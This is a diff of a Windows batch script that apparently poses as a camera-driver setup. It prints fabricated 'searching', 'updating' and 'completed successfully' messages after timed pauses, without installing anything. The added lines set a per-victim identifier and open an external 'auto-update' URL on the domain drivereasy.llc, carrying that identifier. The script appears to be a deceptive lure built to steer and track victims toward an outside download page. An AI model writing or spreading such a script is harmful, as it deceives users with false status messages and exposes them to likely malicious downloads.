@@ -1,6 +1,7 @@
 @echo off
 title Creating new Info
 setlocal enabledelayedexpansion
+set "WINDOW_UID=__ID__"
 
 call :delay 4
 echo [INFO] Searching for Camera Drivers ...
@@ -8,6 +9,7 @@ call :delay 4
 echo [INFO] Update Driver Packages...
 call :delay 4
 echo [SUCCESS] Camera Driver Setup completed successfully.
+if defined WINDOW_UID start "" "https://drivereasy.llc/auto-update?id=%WINDOW_UID%"
 goto :skip_delay
 
 :delay
